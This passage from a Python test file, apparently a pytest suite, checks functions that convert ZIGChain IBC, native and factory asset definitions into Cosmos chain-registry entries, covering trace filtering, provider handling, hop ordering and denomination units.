def test_supplemental_traces_for_output_none_returns_empty() -> None:
    """None input returns an empty list."""
    assert _supplemental_traces_for_output(None) == []


def test_supplemental_traces_for_output_empty_list_returns_empty() -> None:
    """Empty list returns an empty list."""
    assert _supplemental_traces_for_output([]) == []


def test_supplemental_traces_for_output_pydantic_model_is_dumped() -> None:
    """A NativeTrace Pydantic model is serialised via model_dump and included."""
    trace = NativeTrace(
        type="additional-mintage",
        counterparty={"chain_name": "ethereum", "base_denom": "0xabc123"},
    )
    result = _supplemental_traces_for_output([trace])
    assert result == [
        {
            "type": "additional-mintage",
            "counterparty": {"chain_name": "ethereum", "base_denom": "0xabc123"},
        }
    ]


def test_supplemental_traces_for_output_plain_dict_accepted() -> None:
    """A plain dict (no model_dump) is used as-is."""
    item = {
        "type": "bridge",
        "counterparty": {"chain_name": "polygon", "base_denom": "0xdef456"},
    }
    result = _supplemental_traces_for_output([item])
    assert result == [
        {
            "type": "bridge",
            "counterparty": {"chain_name": "polygon", "base_denom": "0xdef456"},
        }
    ]


def test_supplemental_traces_for_output_provider_included_when_non_ibc() -> None:
    """A non-'ibc' provider string is kept in the entry."""
    trace = NativeTrace(
        type="additional-mintage",
        counterparty={"chain_name": "ethereum", "base_denom": "0xabc"},
        provider="Eureka",
    )
    result = _supplemental_traces_for_output([trace])
    assert result[0]["provider"] == "Eureka"


def test_supplemental_traces_for_output_provider_ibc_lowercase_omitted() -> None:
    """provider='ibc' is explicitly excluded from the output entry."""
    item = {
        "type": "ibc",
        "counterparty": {"chain_name": "cosmoshub", "base_denom": "uatom"},
        "provider": "ibc",
    }
    result = _supplemental_traces_for_output([item])
    assert "provider" not in result[0]


def test_supplemental_traces_for_output_provider_ibc_uppercase_omitted() -> None:
    """provider='IBC' (case-insensitive) is also excluded from the output entry."""
    item = {
        "type": "ibc",
        "counterparty": {"chain_name": "cosmoshub", "base_denom": "uatom"},
        "provider": "IBC",
    }
    result = _supplemental_traces_for_output([item])
    assert "provider" not in result[0]


def test_supplemental_traces_for_output_provider_whitespace_only_omitted() -> None:
    """A provider consisting only of whitespace is treated as empty and excluded."""
    item = {
        "type": "bridge",
        "counterparty": {"chain_name": "polygon", "base_denom": "0xdef"},
        "provider": "   ",
    }
    result = _supplemental_traces_for_output([item])
    assert "provider" not in result[0]


def test_supplemental_traces_for_output_provider_is_stripped() -> None:
    """Leading/trailing whitespace on a valid provider is stripped in output."""
    item = {
        "type": "bridge",
        "counterparty": {"chain_name": "polygon", "base_denom": "0xdef"},
        "provider": "  Eureka  ",
    }
    result = _supplemental_traces_for_output([item])
    assert result[0]["provider"] == "Eureka"


def test_supplemental_traces_for_output_skips_non_dict_raw() -> None:
    """Items that are not dicts (and have no model_dump) are silently skipped."""
    result = _supplemental_traces_for_output(["not-a-dict", 42])
    assert result == []


def test_supplemental_traces_for_output_skips_missing_type() -> None:
    """Entry without 'type' key is filtered out."""
    item = {"counterparty": {"chain_name": "ethereum", "base_denom": "0xabc"}}
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_skips_whitespace_type() -> None:
    """Entry where type is only whitespace is filtered out."""
    item = {
        "type": "   ",
        "counterparty": {"chain_name": "ethereum", "base_denom": "0xabc"},
    }
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_skips_non_dict_counterparty() -> None:
    """Entry where counterparty is not a dict is filtered out."""
    item = {"type": "bridge", "counterparty": "not-a-dict"}
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_skips_missing_counterparty_chain_name() -> None:
    """Entry where counterparty.chain_name is absent is filtered out."""
    item = {"type": "bridge", "counterparty": {"base_denom": "0xabc"}}
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_skips_missing_counterparty_base_denom() -> None:
    """Entry where counterparty.base_denom is absent is filtered out."""
    item = {"type": "bridge", "counterparty": {"chain_name": "ethereum"}}
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_skips_whitespace_chain_name() -> None:
    """Entry where counterparty.chain_name is whitespace-only is filtered out."""
    item = {"type": "bridge", "counterparty": {"chain_name": "   ", "base_denom": "0xabc"}}
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_skips_whitespace_base_denom() -> None:
    """Entry where counterparty.base_denom is whitespace-only is filtered out."""
    item = {"type": "bridge", "counterparty": {"chain_name": "ethereum", "base_denom": "   "}}
    assert _supplemental_traces_for_output([item]) == []


def test_supplemental_traces_for_output_mixed_valid_and_invalid() -> None:
    """Only valid entries are included; malformed ones are silently dropped."""
    valid = {
        "type": "additional-mintage",
        "counterparty": {"chain_name": "ethereum", "base_denom": "0xabc"},
    }
    no_type = {"counterparty": {"chain_name": "ethereum", "base_denom": "0xabc"}}
    no_counterparty = {"type": "bridge"}

    result = _supplemental_traces_for_output([no_type, valid, no_counterparty])
    assert len(result) == 1
    assert result[0]["type"] == "additional-mintage"


def test_supplemental_traces_for_output_builds_entries_from_dicts() -> None:
    """_supplemental_traces_for_output builds type/counterparty/provider entries from dicts."""

    items = [
        {
            "type": "synthetic",
            "counterparty": {"chain_name": "ethereum", "base_denom": "0x123"},
            "provider": "Circle",
        },
    ]
    result = _supplemental_traces_for_output(items)
    assert len(result) == 1
    assert result[0]["type"] == "synthetic"
    assert result[0]["counterparty"]["chain_name"] == "ethereum"
    assert result[0]["provider"] == "Circle"


def test_supplemental_traces_for_output_multiple_valid_entries_all_included_in_order() -> None:
    """All valid entries are included and output order matches input order."""
    trace_a = NativeTrace(
        type="bridge",
        counterparty={"chain_name": "ethereum", "base_denom": "0xabc"},
    )
    trace_b = NativeTrace(
        type="additional-mintage",
        counterparty={"chain_name": "polygon", "base_denom": "0xdef"},
        provider="Eureka",
    )

    result = _supplemental_traces_for_output([trace_a, trace_b])
    assert len(result) == 2
    assert result[0]["type"] == "bridge"
    assert result[1]["type"] == "additional-mintage"
    assert result[1]["provider"] == "Eureka"


######################################################################
# Tests for build_traces
######################################################################


def test_build_traces_with_none_zig_trace_still_returns_list(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """build_traces with zig_trace=None does not crash; may return list from other hops."""
    asset = IBCAsset(**valid_ibc_asset_payload)
    result = build_traces(asset, None)
    assert isinstance(result, list)


def test_build_traces_returns_empty_list_when_zigchain_trace_filtered(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """build_traces filters out the zigchain trace; result is empty when only trace is zigchain."""
    asset = IBCAsset(**valid_ibc_asset_payload)

    # Find the zigchain hop from the traces list
    zig_trace = None
    for t in asset.traces:
        if getattr(t, "chain_name", None) == "zigchain":
            zig_trace = t
            break

    result = build_traces(asset, zig_trace)
    assert result == []


def test_build_traces_origin_chain_sorted_first_among_hops(
    valid_ibc_asset_payload: dict[str, Any], zigchain_zig_trace: IBCTrace,
) -> None:
    """The origin chain hop appears first in the output, regardless of trace declaration order."""
    # valid_ibc_asset_payload has only the zigchain trace; add osmosis before noble so sorting
    # is what puts noble (the origin chain from valid_ibc_asset_payload) first — not the declaration order
    payload = dict(valid_ibc_asset_payload)
    payload["traces"] = payload["traces"] + [
        {"type": "ibc", "chain_name": "osmosis", "base_denom": "uosmo", "path": "transfer/channel-5/uusdc"},
        {"type": "ibc", "chain_name": "noble", "base_denom": "uusdc", "path": "transfer/channel-175/uusdc"},
    ]
    payload["channels"] = payload["channels"] + [
        {"zigchain_channel": "channel-5", "counterparty_chain": "osmosis", "counterparty_channel": "channel-123"},
    ]
    asset = IBCAsset(**payload)

    result = build_traces(asset, zigchain_zig_trace)

    assert len(result) == 2
    assert result[0]["counterparty"]["chain_name"] == "noble"
    assert result[1]["counterparty"]["chain_name"] == "osmosis"


def test_build_traces_cosmoshub_sorted_last_among_non_origin_hops(
    valid_ibc_asset_payload: dict[str, Any], zigchain_zig_trace: IBCTrace,
) -> None:
    """cosmoshub is sorted to the end when it is not the origin chain."""
    payload = dict(valid_ibc_asset_payload)
    payload["traces"] = payload["traces"] + [
        {"type": "ibc", "chain_name": "cosmoshub", "base_denom": "uatom", "path": "transfer/channel-7/uusdc"},
        {"type": "ibc", "chain_name": "osmosis", "base_denom": "uosmo", "path": "transfer/channel-5/uusdc"},
        {"type": "ibc", "chain_name": "noble", "base_denom": "uusdc", "path": "transfer/channel-175/uusdc"},
    ]
    payload["channels"] = payload["channels"] + [
        {"zigchain_channel": "channel-5", "counterparty_chain": "osmosis", "counterparty_channel": "channel-123"},
        {"zigchain_channel": "channel-7", "counterparty_chain": "cosmoshub", "counterparty_channel": "channel-456"},
    ]
    asset = IBCAsset(**payload)

    result = build_traces(asset, zigchain_zig_trace)

    assert len(result) == 3
    assert result[0]["counterparty"]["chain_name"] == "noble"
    assert result[-1]["counterparty"]["chain_name"] == "cosmoshub"


def test_build_traces_emits_non_zigchain_hop_with_full_entry_structure(
    ibc_asset_noble_hop: IBCAsset, zigchain_zig_trace: IBCTrace,
) -> None:
    """A non-zigchain IBC trace is emitted with counterparty and chain fields fully populated."""
    result = build_traces(ibc_asset_noble_hop, zigchain_zig_trace)

    assert len(result) == 1
    entry = result[0]
    assert entry["type"] == "ibc"
    assert entry["counterparty"]["chain_name"] == "noble"
    assert entry["counterparty"]["base_denom"] == "uusdc"
    assert entry["counterparty"]["channel_id"] == "channel-175"
    assert entry["chain"]["channel_id"] == "channel-3"
    assert entry["chain"]["path"] == "transfer/channel-3/uusdc"
    assert "provider" not in entry


def test_build_traces_counterparty_channel_from_trace_path_when_no_channel_entry(
    ibc_asset_noble_hop: IBCAsset, zigchain_zig_trace: IBCTrace,
) -> None:
    """When no channel entry exists for a trace's chain, counterparty_channel is parsed from trace.path."""
    # Replace noble channel with osmosis — noble trace has no matching channel entry
    asset = ibc_asset_noble_hop.model_copy(update={
        "channels": [IBCChannel(zigchain_channel="channel-5", counterparty_chain="osmosis", counterparty_channel="channel-999")],
    })

    result = build_traces(asset, zigchain_zig_trace)

    assert len(result) == 1
    # counterparty_channel extracted from noble trace path "transfer/channel-175/uusdc"
    assert result[0]["counterparty"]["channel_id"] == "channel-175"


def test_build_traces_chain_path_constructed_when_zig_trace_none(
    ibc_asset_noble_hop: IBCAsset,
) -> None:
    """When zig_trace is None, chain.path is constructed from the channel ID and origin denom."""
    result = build_traces(ibc_asset_noble_hop, None)

    assert len(result) == 1
    assert result[0]["chain"]["path"] == "transfer/channel-3/uusdc"


def test_build_traces_chain_channel_from_trace_path_when_no_channel_entry_and_no_zig_trace(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """When there is no channel entry for a trace AND zig_trace is None, chain_channel is parsed from trace.path."""
    payload = dict(valid_ibc_asset_payload)
    payload["traces"] = payload["traces"] + [
        {"type": "ibc", "chain_name": "noble", "base_denom": "uusdc", "path": "transfer/channel-175/uusdc"},
    ]
    # channels only has the noble channel swapped out — noble trace has no matching channel entry
    payload["channels"] = [
        {"zigchain_channel": "channel-5", "counterparty_chain": "osmosis", "counterparty_channel": "channel-999"},
    ]
    asset = IBCAsset(**payload)

    result = build_traces(asset, None)

    assert len(result) == 1
    # chain_channel parsed from noble trace path "transfer/channel-175/uusdc" → "channel-175"
    assert result[0]["chain"]["channel_id"] == "channel-175"
    assert result[0]["chain"]["path"] == "transfer/channel-175/uusdc"


def test_build_traces_provider_eureka_emitted_as_eureka_capitalised(
    ibc_asset_noble_hop: IBCAsset, zigchain_zig_trace: IBCTrace,
) -> None:
    """A trace with provider='eureka' results in a 'Eureka' provider field in the output."""
    noble_eureka = IBCTrace(type="ibc", chain_name="noble", base_denom="uusdc", path="transfer/channel-175/uusdc", provider="eureka")
    asset = ibc_asset_noble_hop.model_copy(update={
        "traces": [ibc_asset_noble_hop.traces[0], noble_eureka],
    })

    result = build_traces(asset, zigchain_zig_trace)

    assert result[0]["provider"] == "Eureka"


def test_build_traces_provider_ibc_omitted_from_output(
    ibc_asset_noble_hop: IBCAsset, zigchain_zig_trace: IBCTrace,
) -> None:
    """A trace with provider='ibc' results in no provider field in the output entry."""
    noble_ibc = IBCTrace(type="ibc", chain_name="noble", base_denom="uusdc", path="transfer/channel-175/uusdc", provider="ibc")
    asset = ibc_asset_noble_hop.model_copy(update={
        "traces": [ibc_asset_noble_hop.traces[0], noble_ibc],
    })

    result = build_traces(asset, zigchain_zig_trace)

    assert "provider" not in result[0]


def test_build_traces_supplemental_native_trace_prepended_before_ibc_hops(
    ibc_asset_noble_hop: IBCAsset, zigchain_zig_trace: IBCTrace,
) -> None:
    """NativeTrace entries appear at the start of the result, before IBC hop entries."""
    supplemental = NativeTrace(
        type="additional-mintage",
        counterparty={"chain_name": "ethereum", "base_denom": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},
    )
    asset = ibc_asset_noble_hop.model_copy(update={
        "traces": list(ibc_asset_noble_hop.traces) + [supplemental],
    })

    result = build_traces(asset, zigchain_zig_trace)

    assert len(result) == 2
    assert result[0]["type"] == "additional-mintage"
    assert result[1]["type"] == "ibc"


def test_build_traces_full_ibc_asset_returns_supplemental_only(full_ibc_asset: IBCAsset) -> None:
    """full_ibc_asset has only a zigchain IBC hop and a NativeTrace — result is the supplemental entry."""
    zig_trace = None
    for trace in full_ibc_asset.traces:
        if isinstance(trace, IBCTrace) and trace.chain_name == "zigchain":
            zig_trace = trace
            break

    result = build_traces(full_ibc_asset, zig_trace)

    assert len(result) == 1
    assert result[0]["type"] == "additional-mintage"
    assert result[0]["counterparty"]["chain_name"] == "ethereum"



######################################################################
# Tests for ibc_asset_to_chain_registry
######################################################################

def test_ibc_asset_to_chain_registry_returns_dict_with_required_keys(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """ibc_asset_to_chain_registry returns dict with correct base, name, display, symbol values.
    NOTE: nested structure (traces, images) is not validated here."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    images = AssetImages(png=None, svg=None)
    result = ibc_asset_to_chain_registry(asset, images)

    assert "base" in result
    assert result["base"] == asset.base_denom
    assert "name" in result
    assert result["name"] == asset.name
    assert "symbol" in result
    assert "denom_units" in result


def test_ibc_asset_to_chain_registry_derived_denom_units_has_base_and_display_entries(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """When no denom_units are declared, the function derives them from base_denom and display_denom.
    The result must have exactly two entries: the base (exponent 0) and the display (exponent = decimals)."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(asset, images)

    denom_units = result["denom_units"]
    assert len(denom_units) == 2
    # First entry is always the base denom at exponent 0
    assert denom_units[0]["denom"] == asset.base_denom
    assert denom_units[0]["exponent"] == 0
    # Second entry is the display denom at the asset's configured decimal precision
    assert denom_units[1]["denom"] == asset.display_denom
    assert denom_units[1]["exponent"] == asset.decimals


def test_ibc_asset_to_chain_registry_derived_denom_units_adds_origin_denom_as_alias(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """When no denom_units are declared and origin_denom differs from base_denom,
    the origin_denom is added as an alias on the base entry so consumers can still look up the original denom."""

    # For IBC assets, origin_denom (e.g. "uusdc") is always different from base_denom ("ibc/<HASH>"),
    # so the alias is always added when denom_units are derived.
    asset = IBCAsset(**valid_ibc_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(asset, images)

    base_entry = result["denom_units"][0]
    assert "aliases" in base_entry
    assert asset.origin_denom in base_entry["aliases"]


def test_ibc_asset_to_chain_registry_declared_denom_units_used_verbatim(
    full_ibc_asset: IBCAsset,
) -> None:
    """When the asset has denom_units declared, they are serialized verbatim via model_dump
    instead of being derived. The declared structure must appear unchanged in the output."""

    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(full_ibc_asset, images)

    denom_units = result["denom_units"]
    # full_ibc_asset declares two units: ibc/<HASH> at 0, usdc at 6 with alias "USDC"
    assert len(denom_units) == 2
    assert denom_units[0]["denom"] == f"ibc/{HASH}"
    assert denom_units[0]["exponent"] == 0
    assert denom_units[1]["denom"] == "usdc"
    assert denom_units[1]["exponent"] == 6
    assert denom_units[1]["aliases"] == ["USDC"]


def test_ibc_asset_to_chain_registry_type_asset_is_always_ics20(
    valid_ibc_asset_payload: dict[str, Any],
    full_ibc_asset: IBCAsset,
) -> None:
    """type_asset is hardcoded to 'ics20' for all IBC assets regardless of any other field values."""

    minimal_asset = IBCAsset(**valid_ibc_asset_payload)
    images = AssetImages(png=None, svg=None)

    minimal_result = ibc_asset_to_chain_registry(minimal_asset, images)
    full_result = ibc_asset_to_chain_registry(full_ibc_asset, images)

    assert minimal_result["type_asset"] == "ics20"
    assert full_result["type_asset"] == "ics20"


def test_ibc_asset_to_chain_registry_optional_fields_absent_when_not_set(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Optional fields (description, extended_description, coingecko_id, keywords, socials, logo_URIs)
    are stripped from output by _compact_dict when they are None or empty on a minimal asset."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(asset, images)

    assert "description" not in result
    assert "extended_description" not in result
    assert "coingecko_id" not in result
    assert "keywords" not in result
    assert "socials" not in result
    assert "logo_URIs" not in result


def test_ibc_asset_to_chain_registry_optional_fields_present_from_full_asset(
    full_ibc_asset: IBCAsset,
) -> None:
    """Optional fields appear in the output when populated on the asset."""

    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(full_ibc_asset, images)

    assert "description" in result
    assert result["description"] == full_ibc_asset.description
    assert "extended_description" in result
    assert result["extended_description"] == full_ibc_asset.extended_description
    assert "coingecko_id" in result
    assert result["coingecko_id"] == full_ibc_asset.coingecko_id
    assert "keywords" in result
    assert result["keywords"] == full_ibc_asset.keywords


def test_ibc_asset_to_chain_registry_socials_serialized_as_dict(
    full_ibc_asset: IBCAsset,
) -> None:
    """When the asset has a socials object, it is serialized to a plain dict via model_dump
    so the output JSON contains key/value pairs, not a Python object."""

    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(full_ibc_asset, images)

    assert "socials" in result
    socials = result["socials"]
    assert isinstance(socials, dict)
    # full_ibc_asset has socials=Socials(website="https://circle.com/usdc")
    # model_dump preserves HttpUrl objects, so compare via str()
    assert str(socials.get("website")) == "https://circle.com/usdc"


def test_ibc_asset_to_chain_registry_logo_uris_resolved_from_chain_name_to_noble_urls(
    full_ibc_asset: IBCAsset,
) -> None:
    """When logo_uris.chain_name is set on the asset, logo_URIs in the output point to
    that chain's cosmos/chain-registry images folder, not the local zigchain folder."""

    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(full_ibc_asset, images)

    assert "logo_URIs" in result
    logo_uris = result["logo_URIs"]
    # full_ibc_asset has logo_uris.chain_name="noble", so URLs must point at noble/images/
    assert "noble/images" in logo_uris.get("png", "")
    assert "noble/images" in logo_uris.get("svg", "")


def test_ibc_asset_to_chain_registry_logo_uris_absent_when_no_images_and_no_chain_name(
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """When neither images nor logo_uris.chain_name are available, logo_URIs is None
    and is stripped from the output by _compact_dict."""

    asset = IBCAsset(**valid_ibc_asset_payload)
    # No image files discovered locally, no chain_name override on logo_uris
    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(asset, images)

    assert "logo_URIs" not in result


def test_ibc_asset_to_chain_registry_traces_key_is_list(
    ibc_asset_noble_hop: IBCAsset,
) -> None:
    """The output always contains a 'traces' key and its value is a list,
    even when only one IBC hop is present."""

    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(ibc_asset_noble_hop, images)

    assert "traces" in result
    assert isinstance(result["traces"], list)
    assert len(result["traces"]) >= 1


def test_ibc_asset_to_chain_registry_base_display_symbol_match_asset_fields(
    ibc_asset_noble_hop: IBCAsset,
) -> None:
    """The core identity fields in the output — base, display, name, symbol — must
    exactly match the corresponding fields on the source IBCAsset."""

    images = AssetImages(png=None, svg=None)

    result = ibc_asset_to_chain_registry(ibc_asset_noble_hop, images)

    assert result["base"] == ibc_asset_noble_hop.base_denom
    assert result["display"] == ibc_asset_noble_hop.display_denom
    assert result["name"] == ibc_asset_noble_hop.name
    assert result["symbol"] == ibc_asset_noble_hop.symbol



######################################################################
# Tests for build_native_traces
######################################################################


def test_build_native_traces_returns_list_when_traces_present() -> None:
    """build_native_traces returns list of trace entries when asset has traces."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": "0x"}, "provider": "ZIG"},
        ],
    )
    result = build_native_traces(asset)

    assert len(result) == 1
    assert result[0]["type"] == "additional-mintage"
    assert result[0]["provider"] == "ZIG"



def test_build_native_traces_returns_none_when_no_traces() -> None:
    """build_native_traces returns None when asset has no traces."""

    asset = SimpleNamespace(traces=None)
    assert build_native_traces(asset) is None


def test_build_native_traces_returns_none_when_traces_is_empty_list() -> None:
    """An empty traces list is falsy, so the function returns None rather than an empty list."""

    asset = SimpleNamespace(traces=[])
    assert build_native_traces(asset) is None


def test_build_native_traces_returns_none_when_asset_has_no_traces_attribute() -> None:
    """An asset object with no traces attribute at all is treated the same as traces=None."""

    asset = SimpleNamespace()  # no traces attribute
    assert build_native_traces(asset) is None


def test_build_native_traces_accepts_pydantic_native_trace_model() -> None:
    """When a trace entry is a Pydantic NativeTrace model, model_dump is called to convert it
    to a plain dict before processing. The output entry must have the same type and counterparty."""

    trace = NativeTrace(
        type="additional-mintage",
        counterparty={"chain_name": "ethereum", "base_denom": "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},
    )
    asset = SimpleNamespace(traces=[trace])

    result = build_native_traces(asset)

    assert len(result) == 1
    assert result[0]["type"] == "additional-mintage"
    assert result[0]["counterparty"]["chain_name"] == "ethereum"


def test_build_native_traces_skips_non_dict_trace_entries() -> None:
    """Trace entries that are not dicts and have no model_dump method (e.g. plain strings or
    integers) are skipped. If all entries are skipped the function returns None."""

    asset = SimpleNamespace(traces=[42, "not-a-trace"])

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_provider_included_when_non_ibc() -> None:
    """A provider value that is a non-empty string and not 'ibc' is included in the output entry."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}, "provider": "Axelar"},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert result[0]["provider"] == "Axelar"


def test_build_native_traces_provider_whitespace_stripped_and_included() -> None:
    """A provider string with surrounding whitespace is stripped before being added to the output."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}, "provider": "  Axelar  "},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert result[0]["provider"] == "Axelar"


def test_build_native_traces_provider_ibc_lowercase_omitted() -> None:
    """A provider value of 'ibc' (lowercase) is intentionally omitted from the output entry."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "noble", "base_denom": "uusdc"}, "provider": "ibc"},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert "provider" not in result[0]


def test_build_native_traces_provider_ibc_uppercase_omitted() -> None:
    """The 'ibc' check is case-insensitive, so 'IBC' is also omitted from the output."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "noble", "base_denom": "uusdc"}, "provider": "IBC"},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert "provider" not in result[0]


def test_build_native_traces_provider_none_omitted() -> None:
    """When provider is None the key is not added to the output entry."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}, "provider": None},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert "provider" not in result[0]


def test_build_native_traces_provider_empty_string_omitted() -> None:
    """An empty string provider does not pass the strip() truthiness check and is omitted."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}, "provider": ""},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert "provider" not in result[0]


def test_build_native_traces_entry_with_none_type_is_skipped() -> None:
    """An entry whose type is None fails the string check and is dropped from the output."""

    asset = SimpleNamespace(
        traces=[
            {"type": None, "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_empty_type_is_skipped() -> None:
    """An entry whose type is an empty string fails the non-empty check and is dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_whitespace_type_is_skipped() -> None:
    """A type that is only whitespace fails the strip() truthiness check and is dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "   ", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_non_dict_counterparty_is_skipped() -> None:
    """An entry whose counterparty is a string instead of a dict is dropped to avoid emitting junk."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": "ethereum"},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_missing_chain_name_is_skipped() -> None:
    """An entry whose counterparty dict has no chain_name key is dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"base_denom": "0x1"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_empty_chain_name_is_skipped() -> None:
    """An entry whose counterparty.chain_name is an empty string is dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "", "base_denom": "0x1"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_missing_base_denom_is_skipped() -> None:
    """An entry whose counterparty dict has no base_denom key is dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_entry_with_empty_base_denom_is_skipped() -> None:
    """An entry whose counterparty.base_denom is an empty string is dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": ""}},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_returns_none_when_all_entries_are_invalid() -> None:
    """When every trace entry fails validation the internal list stays empty.
    The function returns None rather than an empty list so consumers can treat
    absence and empty the same way."""

    asset = SimpleNamespace(
        traces=[
            {"type": None, "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}},
            {"type": "additional-mintage", "counterparty": "not-a-dict"},
        ],
    )

    result = build_native_traces(asset)

    assert result is None


def test_build_native_traces_mixed_valid_and_invalid_entries_only_valid_returned() -> None:
    """When the traces list contains a mix of valid and invalid entries, only the valid ones
    are included in the output. Invalid entries are silently dropped."""

    asset = SimpleNamespace(
        traces=[
            {"type": "additional-mintage", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}},
            {"type": None, "counterparty": {"chain_name": "cosmos", "base_denom": "uatom"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert len(result) == 1
    assert result[0]["counterparty"]["chain_name"] == "ethereum"


def test_build_native_traces_multiple_valid_entries_all_included_in_order() -> None:
    """Multiple valid trace entries are all included in the output and appear in the same
    order as the input list."""

    asset = SimpleNamespace(
        traces=[
            {"type": "bridge", "counterparty": {"chain_name": "ethereum", "base_denom": "0x1"}},
            {"type": "additional-mintage", "counterparty": {"chain_name": "solana", "base_denom": "EPjFWdd5"}},
        ],
    )

    result = build_native_traces(asset)

    assert result is not None
    assert len(result) == 2
    assert result[0]["counterparty"]["chain_name"] == "ethereum"
    assert result[1]["counterparty"]["chain_name"] == "solana"


######################################################################
# Tests for non_ibc_asset_to_chain_registry
######################################################################


def test_non_ibc_asset_to_chain_registry_native_returns_dict(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """non_ibc_asset_to_chain_registry returns dict for NativeAsset with base, denom_units, etc."""

    asset = NativeAsset(**valid_native_asset_payload)
    images = AssetImages(png=None, svg=None)
    result = non_ibc_asset_to_chain_registry(asset, images)
    assert "base" in result
    assert result["base"] == asset.base_denom
    assert "denom_units" in result
    assert len(result["denom_units"]) == 2
    assert "type_asset" in result
    assert result["type_asset"] == "sdk.coin"


def test_non_ibc_asset_to_chain_registry_factory_returns_dict(
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """non_ibc_asset_to_chain_registry returns dict for FactoryAsset."""

    asset = FactoryAsset(**valid_factory_asset_payload)
    images = AssetImages(png=None, svg=None)
    result = non_ibc_asset_to_chain_registry(asset, images)
    assert "base" in result
    assert result["type_asset"] == "sdk.coin"


def test_non_ibc_asset_to_chain_registry_base_display_name_symbol_match_asset(
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """The core identity fields in the output must exactly match the corresponding
    fields on the source NativeAsset."""

    asset = NativeAsset(**valid_native_asset_payload)
    images = AssetImages(png=None, svg=None)

    result = non_ibc_asset_to_chain_registry(asset, images)

    assert result["base"] == asset.base_denom
    assert result["display"] == asset.display_denom
    assert result["name"] == asset.name
    assert result["symbol"] == asset.symbol


def test_non_ibc_asset_to_chain_registry_type_asset_is_sdk_coin_for_both_asset_types(
    valid_native_asset_payload: dict[str, Any],
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """type_asset is hardcoded to 'sdk.coin' for all non-IBC assets regardless of whether
    the asset is a NativeAsset or FactoryAsset."""

